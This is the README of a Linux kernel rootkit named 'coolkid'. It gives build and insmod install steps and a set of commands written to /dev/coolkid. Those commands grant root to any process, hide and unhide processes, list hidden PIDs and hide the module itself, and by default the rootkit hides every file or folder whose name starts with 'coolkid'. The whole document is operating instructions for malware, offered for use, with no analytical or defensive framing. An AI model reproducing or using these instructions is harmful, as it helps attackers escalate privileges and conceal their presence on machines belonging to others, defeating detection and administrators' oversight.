# coolkid rootkit
## compilation
make
 
## install
sudo insmod coolkid.ko

## usage
Linux version > 4.17, otherwise it will fail

`echo -n "1000000000 $PID" > /dev/coolkid`  will give root permissions to the process

`echo -n "1000000001" > /dev/coolkid` then `cat /dev/coolkid` will list you all the processes running

`echo -n "1000000002" > /dev/coolkid` then `cat /dev/coolkid` will gives you the pids of invisible processes 

`echo -n "1000000003 $PID" > /dev/coolkid` will hide/unhide the process

`echo -n "1000000004" > /dev/coolkid` will hide the module

by default every file/repo starting by coolkid will disapear on the system
